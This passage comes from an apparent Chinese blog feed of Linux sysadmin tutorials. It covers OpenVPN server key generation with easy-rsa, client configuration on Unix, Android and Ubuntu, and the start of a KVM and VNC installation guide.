<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mkdir /etc/openvpn/easy-rsa</div><div class="line">cp -r /usr/share/easy-rsa /etc/openvpn/easy-rsa</div><div class="line">mv /etc/openvpn/easy-rsa/easy-rsa /etc/openvpn/easy-rsa/2.0</div></pre></td></tr></table></figure>
<p>　　然后进入到该目录</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /etc/openvpn/easy-rsa/2.0</div></pre></td></tr></table></figure>
<p>　　这里，我们开始密钥生成进程。</p>
<p>　　首先，我们编辑一个“vars”文件。为了简化生成过程，我们需要在里面指定数据。这里是“vars”文件的一个样例：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">export</span> KEY_COUNTRY=<span class="string">"CN"</span></div><div class="line"><span class="built_in">export</span> KEY_PROVINCE=<span class="string">"BJ"</span></div><div class="line"><span class="built_in">export</span> KEY_CITY=<span class="string">"Beijing"</span></div><div class="line"><span class="built_in">export</span> KEY_ORG=<span class="string">"Linux.CN"</span></div><div class="line"><span class="built_in">export</span> KEY_EMAIL=<span class="string">"open@vpn.linux.cn"</span></div><div class="line"><span class="built_in">export</span> KEY_OU=server</div></pre></td></tr></table></figure>
<p>　　希望这些字段名称对你而言已经很清楚，不需要进一步说明了。</p>
<p>　　其次，我们需要拷贝openssl配置。另外一个版本已经有现成的配置文件，如果你没有特定要求，你可以使用它的上一个版本。这里是1.0.0版本。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cp openssl-1.0.0.cnf openssl.cnf</div></pre></td></tr></table></figure>
<p>　　第三，我们需要加载环境变量，这些变量已经在前面一步中编辑好了。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">source</span> ./vars</div></pre></td></tr></table></figure>
<p>　　生成密钥的最后一步准备工作是清空旧的证书和密钥，以及生成新密钥的序列号和索引文件。可以通过以下命令完成。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./clean-all</div></pre></td></tr></table></figure>
<p>　　现在，我们完成了准备工作，准备好启动生成进程了。让我们先来生成证书。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./build-ca</div></pre></td></tr></table></figure>
<p>　　在对话中，我们可以看到默认的变量，这些变量是我们先前在“vars”中指定的。我们可以检查一下，如有必要进行编辑，然后按回车几次。对话如下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">Generating a 2048 bit RSA private key</div><div class="line">.............................................+++</div><div class="line">...................................................................................................+++</div><div class="line">writing new private key to <span class="string">'ca.key'</span></div><div class="line">-----</div><div class="line">You are about to be asked to enter information that will be incorporated</div><div class="line">into your certificate request.</div><div class="line">What you are about to enter is what is called a Distinguished Name or a DN.</div><div class="line">There are quite a few fields but you can leave some blank</div><div class="line">For some fields there will be a default value,</div><div class="line">If you enter <span class="string">'.'</span>, the field will be left blank.</div><div class="line">-----</div><div class="line">Country Name (2 letter code) [CN]:</div><div class="line">State or Province Name (full name) [BJ]:</div><div class="line">Locality Name (eg, city) [Beijing]:</div><div class="line">Organization Name (eg, company) [Linux.CN]:</div><div class="line">Organizational Unit Name (eg, section) [Tech]:</div><div class="line">Common Name (eg, your name or your server<span class="string">'s hostname) [Linux.CN CA]:</span></div><div class="line">Name [EasyRSA]:</div><div class="line">Email Address [open@vpn.linux.cn]:</div></pre></td></tr></table></figure>
<p>　　接下来，我们需要生成一个服务器密钥</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./build-key-server server</div></pre></td></tr></table></figure>
<p>　　该命令的对话如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">Generating a 2048 bit RSA private key</div><div class="line">........................................................................+++</div><div class="line">............................+++</div><div class="line">writing new private key to <span class="string">'server.key'</span></div><div class="line">-----</div><div class="line">You are about to be asked to enter information that will be incorporated</div><div class="line">into your certificate request.</div><div class="line">What you are about to enter is what is called a Distinguished Name or a DN.</div><div class="line">There are quite a few fields but you can leave some blank</div><div class="line">For some fields there will be a default value,</div><div class="line">If you enter <span class="string">'.'</span>, the field will be left blank.</div><div class="line">-----</div><div class="line">Country Name (2 letter code) [CN]:</div><div class="line">State or Province Name (full name) [BJ]:</div><div class="line">Locality Name (eg, city) [Beijing]:</div><div class="line">Organization Name (eg, company) [Linux.CN]:</div><div class="line">Organizational Unit Name (eg, section) [Tech]:</div><div class="line">Common Name (eg, your name or your server<span class="string">'s hostname) [Linux.CN server]:</span></div><div class="line">Name [EasyRSA]:</div><div class="line">Email Address [open@vpn.linux.cn]:</div><div class="line">Please enter the following 'extra<span class="string">' attributes</span></div><div class="line">to be sent with your certificate request</div><div class="line">A challenge password []:</div><div class="line">An optional company name []:</div><div class="line">Using configuration from /etc/openvpn/easy-rsa/2.0/openssl-1.0.0.cnf</div><div class="line">Check that the request matches the signature</div><div class="line">Signature ok</div><div class="line">The Subject's Distinguished Name is as follows</div><div class="line">countryName :PRINTABLE:<span class="string">'CN'</span></div><div class="line">stateOrProvinceName :PRINTABLE:<span class="string">'BJ'</span></div><div class="line">localityName :PRINTABLE:<span class="string">'Beijing'</span></div><div class="line">organizationName :PRINTABLE:<span class="string">'Linux.CN'</span></div><div class="line">organizationalUnitName:PRINTABLE:<span class="string">'Tech'</span></div><div class="line">commonName :PRINTABLE:<span class="string">'Linux.CN server'</span></div><div class="line">name :PRINTABLE:<span class="string">'EasyRSA'</span></div><div class="line">emailAddress :IA5STRING:<span class="string">'open@vpn.linux.cn'</span></div><div class="line">Certificate is to be certified until May 22 19:00:25 2025 GMT (3650 days)</div><div class="line">Sign the certificate? [y/n]:y</div><div class="line">1 out of 1 certificate requests certified, commit? [y/n]y</div><div class="line">Write out database with 1 new entries</div><div class="line">Data Base Updated</div></pre></td></tr></table></figure>
<p>　　这里，最后两个关于“签署证书”和“提交”的问题，我们必须回答“yes”。</p>
<p>　　现在，我们已经有了证书和服务器密钥。下一步，就是去省城Diffie-Hellman密钥。执行以下命令，耐心等待。在接下来的几分钟内，我们将看到许多点和加号。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./build-dh</div></pre></td></tr></table></figure>
<p>　　该命令的输出样例如下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Generating DH parameters, 2048 bit long safe prime, generator 2</div><div class="line">This is going to take a long time</div><div class="line">................................+................&lt;许多的点&gt;</div></pre></td></tr></table></figure>
<p>　　在漫长的等待之后，我们可以继续生成最后的密钥了，该密钥用于TLS验证。命令如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">openvpn --genkey --secret keys/ta.key</div></pre></td></tr></table></figure>
<p>　　现在，生成完毕，我们可以移动所有生成的文件到最后的位置中。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cp -r /etc/openvpn/easy-rsa/2.0/keys/ /etc/openvpn/</div></pre></td></tr></table></figure>
<p>　　最后，我们来创建OpenVPN配置文件。让我们从样例中拷贝过来吧：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cp /usr/share/doc/openvpn/examples/sample-config-files/server.conf.gz /etc/openvpn/</div><div class="line"><span class="built_in">cd</span> /etc/openvpn</div><div class="line">gunzip <span class="_">-d</span> /etc/openvpn/server.conf.gz</div></pre></td></tr></table></figure>
<p>　　然后编辑</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/openvpn/server.conf</div></pre></td></tr></table></figure>
<p>　　我们需要指定密钥的自定义路径</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ca /etc/openvpn/keys/ca.crt</div><div class="line">cert /etc/openvpn/keys/server.crt</div><div class="line">key /etc/openvpn/keys/server.key <span class="comment"># This file should be kept secret</span></div><div class="line">dh /etc/openvpn/keys/dh2048.pem</div></pre></td></tr></table></figure>
<p>　　一切就绪。在重启OpenVPN后，服务器端配置就完成了。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service openvpn restart</div></pre></td></tr></table></figure>
<h1 id="Unix的客户端配置"><a href="#Unix的客户端配置" class="headerlink" title="Unix的客户端配置"></a>Unix的客户端配置</h1><p>　　假定我们有一台装有类Unix操作系统的设备，比如Ubuntu 15.04，并安装有OpenVPN。我们想要连接到前面建立的OpenVPN服务器。首先，我们需要为客户端生成密钥。为了生成该密钥，请转到服务器上的对应目录中：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /etc/openvpn/easy-rsa/2.0</div></pre></td></tr></table></figure>
<p>　　加载环境变量</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">source</span> vars</div></pre></td></tr></table></figure>
<p>　　然后创建客户端密钥</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./build-key client</div></pre></td></tr></table></figure>
<p>　　我们将看到一个与先前关于服务器密钥生成部分的章节描述一样的对话，填入客户端的实际信息。</p>
<p>　　如果需要密码保护密钥，你需要运行另外一个命令，命令如下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./build-key-pass client</div></pre></td></tr></table></figure>
<p>　　在此种情况下，在建立VPN连接时，会提示你输入密码。</p>
<p>　　现在，我们需要将以下文件从服务器拷贝到客户端/etc/openvpn/keys/文件夹。</p>
<p>　　服务器文件列表：</p>
<ul>
<li>ca.crt,</li>
<li>dh2048.pem,</li>
<li>client.crt,</li>
<li>client.key,</li>
<li>ta.key.</li>
</ul>
<p>　　在此之后，我们转到客户端，准备配置文件。配置文件位于/etc/openvpn/client.conf，内容如下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">dev tun</div><div class="line">proto udp</div><div class="line"></div><div class="line"><span class="comment"># 远程 OpenVPN 服务器的 IP 和 端口号</span></div><div class="line">remote 111.222.333.444 1194</div><div class="line"></div><div class="line">resolv-retry infinite</div><div class="line"></div><div class="line">ca /etc/openvpn/keys/ca.crt</div><div class="line">cert /etc/openvpn/keys/client.crt</div><div class="line">key /etc/openvpn/keys/client.key</div><div class="line">tls-client</div><div class="line">tls-auth /etc/openvpn/keys/ta.key 1</div><div class="line">auth SHA1</div><div class="line">cipher BF-CBC</div><div class="line">remote-cert-tls server</div><div class="line">comp-lzo</div><div class="line">persist-key</div><div class="line">persist-tun</div><div class="line"></div><div class="line">status openvpn-status.log</div><div class="line"><span class="built_in">log</span> /var/<span class="built_in">log</span>/openvpn.log</div><div class="line">verb 3</div><div class="line">mute 20</div></pre></td></tr></table></figure>
<p>　　在此之后，我们需要重启OpenVPN以接受新配置。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service openvpn restart</div></pre></td></tr></table></figure>
<p>　　好了，客户端配置完成。</p>
<p>#安卓客户端配置</p>
<p>　　安卓设备上的OpenVPN配置和Unix系统上的十分类似，我们需要一个含有配置文件、密钥和证书的包。文件列表如下：</p>
<ul>
<li>配置文件 (扩展名 .ovpn),</li>
<li>ca.crt,</li>
<li>dh2048.pem,</li>
<li>client.crt,</li>
<li>client.key.</li>
</ul>
<p>　　客户端密钥生成方式和先前章节所述的一样。</p>
<p>　　配置文件内容如下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">client tls-client</div><div class="line">dev tun</div><div class="line">proto udp</div><div class="line"></div><div class="line"><span class="comment"># 远程 OpenVPN 服务器的 IP 和 端口号</span></div><div class="line">remote 111.222.333.444 1194</div><div class="line"></div><div class="line">resolv-retry infinite</div><div class="line">nobind</div><div class="line">ca ca.crt</div><div class="line">cert client.crt</div><div class="line">key client.key</div><div class="line">dh dh2048.pem</div><div class="line">persist-tun</div><div class="line">persist-key</div><div class="line"></div><div class="line">verb 3</div><div class="line">mute 20</div></pre></td></tr></table></figure>
<p>　　所有这些文件我们必须移动我们设备的SD卡上。</p>
<p>　　然后，我们需要安装一个OpenVPN Connect 应用。</p>
<p>　　接下来，配置过程很是简单：</p>
<ul>
<li>打开 OpenVPN 并选择“Import”选项</li>
<li>选择“Import Profile from SD card”</li>
<li>在打开的窗口中导航到我们放置好文件的目录，并选择那个 .ovpn 文件</li>
<li>应用会要求我们创建一个新的配置文件</li>
<li>点击“Connect”按钮并稍等一下</li>
</ul>
<p>　　搞定。现在，我们的安卓设备已经通过安全的VPN连接连接到我们的专用网。</p>
<h1 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h1><p>　　虽然OpenVPN初始配置花费不少时间，但是简易的客户端配置为我们弥补了时间上的损失，也提供了从任何设备连接的能力。此外，OpenVPN提供了一个很高的安全等级，以及从不同地方连接的能力，包括位于NAT后面的客户端。因此，OpenVPN可以同时在家和企业中使用。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;　　虚拟专用网（VPN）常指几种通过其它网络建立连接技术。它之所以被称为“虚拟”，是因为各个节点间的连接不是通过物理线路实现的，而“专用”是指如果没有网络所有者的正确授权是不能被公开访问到。&lt;/p&gt;
    
    </summary>
    
      <category term="service" scheme="http://www.unix-like.com/categories/service/"/>
    
    
      <category term="openvpn" scheme="http://www.unix-like.com/tags/openvpn/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu下OpenVPN客户端配置</title>
    <link href="http://www.unix-like.com/2017/06/06/service/Ubuntu%E4%B8%8BOpenVPN%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE/"/>
    <id>http://www.unix-like.com/2017/06/06/service/Ubuntu下OpenVPN客户端配置/</id>
    <published>2017-06-06T05:37:35.000Z</published>
    <updated>2017-06-06T05:39:23.471Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装OpenVPN"><a href="#安装OpenVPN" class="headerlink" title="安装OpenVPN"></a>安装OpenVPN</h1><p>　　首先需要安装OpenVPN客户端。一般来说直接使用apt-get即可。执行如下命令安装：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[root@www ~]<span class="comment"># apt-get install openvpn</span></div></pre></td></tr></table></figure>
<p>　　稍等片刻将自动安装好openvpn需要的软件包。安装完成后，应该出现 <code>/etc/openvpn/</code> 文件夹。 </p>
<a id="more"></a>
<h1 id="配置OpenVPN"><a href="#配置OpenVPN" class="headerlink" title="配置OpenVPN"></a>配置OpenVPN</h1><p>　　作为客户端，OpenVPN并没有特定的配置文件，而是由服务器提供方给出一个配置文件。对于认证，OpenVPN提供了两种认证方法：基于用户名/密码的认证与SSL证书认证。用户名/密码的认证方法无法（或较难）限制一个账号同时连接多个客户端，而采用证书，则可保证同一证书同一时间只能有一个 客户端连接。当然，这些都是由服务器端决定的，不需要客户端进行选择。</p>
<p>　　首先将OpenVPN服务器提供商发给你的配置文件解压，并将所有文件都复制到 /etc/openvpn/中。</p>
<p>这些文件中至少包含一个.ovpn文件，需要手动创建该文件，如：client.ovpn；如果服务器需要证书认证，则应该还存在另外三个证书文件。</p>
<p>　　看懂OpenVPN配置格式。下面是一个.ovpn配置示例：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">client</div><div class="line">dev tap</div><div class="line">proto tcp-client</div><div class="line">remote 192.168.135.75 1194</div><div class="line">resolv-retry infinite</div><div class="line">nobind</div><div class="line">mute-replay-warnings</div><div class="line">redirect-gateway</div><div class="line">ca /etc/openvpn/ca.crt</div><div class="line">cert /etc/openvpn/client.crt</div><div class="line">key /etc/openvpn/client.key</div><div class="line">comp-lzo</div><div class="line">verb 4</div></pre></td></tr></table></figure>
<p>　　一般来说，ca.crt，client.crt，client.key可能需要你进行修改。将内容修改成这三个文件的实际位置。然后保存即可。 </p>
<h1 id="连接OpenVPN"><a href="#连接OpenVPN" class="headerlink" title="连接OpenVPN"></a>连接OpenVPN</h1><p>　　在配置好.ovpn文件后，执行</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">openvpn /etc/openvpn/client.ovpn</div></pre></td></tr></table></figure>
<p>　　即可连接服务器了（注意该目录下对应文件的权限）。注意，上面的参数应该换成你的配置文件实际位置。</p>
<p>　　此时，终端会回显很多连接日志。如果连接不成功，则可以通过这些日志来确定出错位置。如果要断开，只需要通过Ctrl+C强制终止即可。</p>
<p>　　上面的命令在实际中并不方便，因为它要占用一个独立的终端。在测试成功后，使用以下命令即可在后台连接OpenVPN：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">openvpn /etc/openvpn/client.ovpn &gt; /dev/null &amp;</div></pre></td></tr></table></figure>
<p>　　值得称赞的是，openvpn非常智能，在连接异常中断、无法连接服务器、断网的情况下，它会自动重连。因此，如果希望开机即自动连接OpenVPN，或者是VPN常年在线，则可将上述命令行加入 <code>/etc/rc.local</code> 中。注意，命令末尾的&amp;符号不能省略，否则将可能阻塞系统的正常启动。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;安装OpenVPN&quot;&gt;&lt;a href=&quot;#安装OpenVPN&quot; class=&quot;headerlink&quot; title=&quot;安装OpenVPN&quot;&gt;&lt;/a&gt;安装OpenVPN&lt;/h1&gt;&lt;p&gt;　　首先需要安装OpenVPN客户端。一般来说直接使用apt-get即可。执行如下命令安装：&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@www ~]&lt;span class=&quot;comment&quot;&gt;# apt-get install openvpn&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;　　稍等片刻将自动安装好openvpn需要的软件包。安装完成后，应该出现 &lt;code&gt;/etc/openvpn/&lt;/code&gt; 文件夹。 &lt;/p&gt;
    
    </summary>
    
      <category term="service" scheme="http://www.unix-like.com/categories/service/"/>
    
    
      <category term="openvpn" scheme="http://www.unix-like.com/tags/openvpn/"/>
    
  </entry>
  
  <entry>
    <title>kvm部署及虚拟机安装</title>
    <link href="http://www.unix-like.com/2017/06/04/service/KVM%E9%83%A8%E7%BD%B2%E5%8F%8A%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85/"/>
    <id>http://www.unix-like.com/2017/06/04/service/KVM部署及虚拟机安装/</id>
    <published>2017-06-04T11:20:33.000Z</published>
    <updated>2017-06-04T11:25:21.711Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-KVM安装"><a href="#一-KVM安装" class="headerlink" title="一. KVM安装"></a>一. KVM安装</h1><h2 id="1-查看硬件是否支持虚拟化"><a href="#1-查看硬件是否支持虚拟化" class="headerlink" title="1. 查看硬件是否支持虚拟化"></a>1. 查看硬件是否支持虚拟化</h2><p>　　KVM需要CPU支持虚拟化，执行以下命令查看是否支持虚拟化：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">egrep <span class="string">'(vmx|svm)'</span> --color=always /proc/cpuinfo</div></pre></td></tr></table></figure>
<p>　　如果含有vmx或者svm字样，则表示支持CPU虚拟化，</p>
<p>　　Intel是vmx，AMD是svm。</p>
<a id="more"></a>
<h2 id="2-安装KVM"><a href="#2-安装KVM" class="headerlink" title="2. 安装KVM"></a>2. 安装KVM</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install qemu-kvm qemu-img libvirt libvirt-python libguestfs-tools virt-install</div></pre></td></tr></table></figure>
<p>　　<strong>qemu-kvm</strong> 是一个开源的虚拟机程序，为 KVM 虚拟机监视器提供硬件仿真，而 qemu-img 则提供了一个操纵磁盘镜像的命令行工具。</p>
<p>　　<strong>libvirt</strong> 包含与操作系统的虚拟化功能交互的工具。</p>
<p>　　<strong>libvirt-python</strong> 包含一个模块，它允许用 Python 写的应用来使用由 libvirt 提供的接口。</p>
<p>　　<strong>libguestfs-tools</strong> 包含各式各样的针对虚拟机的系统管理员命令行工具。</p>
<p>　　<strong>virt-install</strong> 包含针对虚拟机管理的其他命令行工具。</p>
<h3 id="2-1-启动并开启了-libvirtd-服务"><a href="#2-1-启动并开启了-libvirtd-服务" class="headerlink" title="2.1. 启动并开启了 libvirtd 服务"></a>2.1. 启动并开启了 libvirtd 服务</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/libvirtd start</div><div class="line"></div><div class="line">chkconfig libvirtd on</div></pre></td></tr></table></figure>
<h3 id="2-2-配置转发"><a href="#2-2-配置转发" class="headerlink" title="2.2. 配置转发"></a>2.2. 配置转发</h3><p>　　文件/etc/sysctl.conf 中设置：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net.ipv4.ip_forward = 1</div></pre></td></tr></table></figure>
<h3 id="2-3-关闭网桥上的Netfilter-提高性能"><a href="#2-3-关闭网桥上的Netfilter-提高性能" class="headerlink" title="2.3. 关闭网桥上的Netfilter(提高性能)"></a>2.3. 关闭网桥上的Netfilter(提高性能)</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">vim /etc/sysctl.conf:</div><div class="line"></div><div class="line">    net.bridge.bridge-nf-call-ip6tables = 0</div><div class="line"></div><div class="line">    net.bridge.bridge-nf-call-iptables = 0</div><div class="line"></div><div class="line">    net.bridge.bridge-nf-call-arptables = 0</div></pre></td></tr></table></figure>
<h3 id="2-4-加载更改到当前的内核配置中："><a href="#2-4-加载更改到当前的内核配置中：" class="headerlink" title="2.4. 加载更改到当前的内核配置中："></a>2.4. 加载更改到当前的内核配置中：</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sysctl -p</div></pre></td></tr></table></figure>
<h2 id="3-KVM网络配置"><a href="#3-KVM网络配置" class="headerlink" title="3. KVM网络配置"></a>3. KVM网络配置</h2><h3 id="3-1-创建桥接器"><a href="#3-1-创建桥接器" class="headerlink" title="3.1. 创建桥接器"></a>3.1. 创建桥接器</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">vim /etc/sysconfig/network-scripts/ifcfg-br0</div><div class="line"></div><div class="line">    DEVICE=br0</div><div class="line">    NAME=br0</div><div class="line">    NM_CONTROLLED=no</div><div class="line">    TYPE=Bridge     <span class="comment"># 注意Bridge大小写</span></div><div class="line">    ONBOOT=yes</div><div class="line">    BOOTPROTO=none</div><div class="line">    BROADCAST=192.168.2.255</div><div class="line">    IPADDR=192.168.2.7</div><div class="line">    NETMASK=255.255.255.0</div><div class="line">    NETWORK=192.168.2.0</div><div class="line">    GATEWAY=192.168.2.1</div></pre></td></tr></table></figure>
<h3 id="3-2-将物理接口桥接到桥接器"><a href="#3-2-将物理接口桥接到桥接器" class="headerlink" title="3.2. 将物理接口桥接到桥接器"></a>3.2. 将物理接口桥接到桥接器</h3><p>　　修改eth0的内容（本服务器是用eth0上网的），去掉其IP相关信息，加上“BRIDGE=br0”，将其桥接到br0上；如果是双网卡或是多网卡，照此过程修改：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">vim /etc/sysconfig/network-scripts/ifcfg-eth0</div><div class="line"></div><div class="line">    DEVICE=eth0</div><div class="line">    NAME=eth0</div><div class="line">    TYPE=Ethernet</div><div class="line">    NM_CONTROLLED=no</div><div class="line">    ONBOOT=yes</div><div class="line">    BRIDGE=br0</div></pre></td></tr></table></figure>
<h3 id="3-3-重启网络"><a href="#3-3-重启网络" class="headerlink" title="3.3. 重启网络"></a>3.3. 重启网络</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/network restart</div></pre></td></tr></table></figure>
<h1 id="二-安装并配置VNC服务"><a href="#二-安装并配置VNC服务" class="headerlink" title="二. 安装并配置VNC服务"></a>二. 安装并配置VNC服务</h1><h2 id="1-安装VNC"><a href="#1-安装VNC" class="headerlink" title="1. 安装VNC"></a>1. 安装VNC</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install tigervnc tigervnc-server</div></pre></td></tr></table></figure>
<h2 id="2-配置VNC"><a href="#2-配置VNC" class="headerlink" title="2. 配置VNC"></a>2. 配置VNC</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">vim /etc/sysconfig/vncservers</div><div class="line"></div><div class="line">    VNCSERVERS=<span class="string">"1:root"</span></div><div class="line">    VNCSERVERARGS[2]=<span class="string">"-geometry 800x600 -nolisten tcp -localhost"</span></div></pre></td></tr></table></figure>
<h2 id="3-设置vnc密码"><a href="#3-设置vnc密码" class="headerlink" title="3.设置vnc密码"></a>3.设置vnc密码</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vncpasswd</div></pre></td></tr></table></figure>
